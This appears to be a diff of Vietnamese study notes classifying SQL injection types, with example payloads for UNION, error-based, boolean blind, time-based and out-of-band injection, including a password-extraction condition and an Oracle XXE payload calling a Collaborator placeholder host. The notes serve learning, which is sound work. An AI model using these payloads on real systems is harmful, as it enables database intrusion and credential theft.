@@ -18,23 +18,33 @@
 ## Types of SQLi
 * **In-band SQLi:** Dữ liệu truy vấn trả về trực tiếp trên giao diện web.
   * **UNION-based**
-    * Mục đích: Ghép thêm kết quả từ bảng khác vào kết quả ban đầu.
-    * Điều kiện: 2 câu lệnh phải trả về cùng số lượng cột và kiểu dữ liệu ở các cột phải tương thích.
-    * Quy trình: Xác định số cột -> Xác định cột chứa string -> Trích xuất dữ liệu
+    * Mục đích: Ghép thêm kết quả từ bảng khác vào kết quả ban đầu, 2 câu lệnh phải trả về cùng số lượng cột và kiểu dữ liệu ở các cột phải tương thích.
+    * Example:
+      ```
+      SELECT name, description
+      FROM products
+      WHERE id = 1
+      UNION SELECT username, password
+      FROM users
+      ```
   * **Error-based**
-    * Mục đích: Kích hoạt thông báo lỗi của CSDL để ép hiển thị dữ liệu nhạy cảm ra màn hình.
-    * Payload mẫu: `CAST((SELECT version()) AS int)`
+    * Type 1: Dựa trên thông báo lỗi của DB để ép hiển thị dữ liệu nhạy cảm ra màn hình.
+      * Example `CAST((SELECT version()) AS int)`
+    * Type 2: Dựa trên mã lỗi HTTP 200/500.
+      * Example `CASE WHEN (1=1) THEN 1/0 ELSE '' END`.
 * **Blind SQLi:** Web không in trực tiếp dữ liệu ra màn hình, phải suy đoán gián tiếp.
   * **Boolean-based**
     * Mục đích: Dựa vào khác biệt nội dung trang web khi mệnh đề True/False.
-    * Payload mẫu: `TrackingId=xyz' AND '1'='1` (Trang có chữ "Welcome"), `TrackingId=xyz' AND '1'='2` (Trang mất chữ "Welcome").
-    * Khai thác trích xuất từng ký tự: `SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 1) = 's'`
-  * **Error-triggered based**
-    * Mục đích: Dựa trên kích hoạt lỗi có điều kiện.
-    * Cách thực hiện: dùng cấu trúc `CASE WHEN` ép lỗi database (chia cho 0, cast sai) nếu True trang web sẽ trả về HTTP 500, ngược lại False trả về HTTP 200.
+    * Example: `SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 1) = 'a'`(True/False).
   * **Time-based**
-    * Mục đích: Ép database sleep trong một khoảng thời gian nếu điều kiện True.
-* **Out-of-band SQLi (OAST):** Ép database gửi request DNS hoặc HTTP ra server bên ngoài khi không thấy kết quả phản hồi nào từ web.
+    * Mục đích: Ép DB sleep trong một khoảng thời gian nếu điều kiện True/False.
+    * Example: `WAITFOR DELAY '0:0:5'`.
+* **Out-of-band SQLi (OAST)**
+  * Mục đích: Ép DB gửi request DNS hoặc HTTP ra server bên ngoài khi không thấy kết quả phản hồi nào từ web.
+  * Example:
+    ```
+    SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+    ```
 
 ## How to detect SQLi
 1. Xác định **entry points** có khả năng truyền dữ liệu vào DB (GET, POST, HTTP Headers, Cookies, API Endpoints).
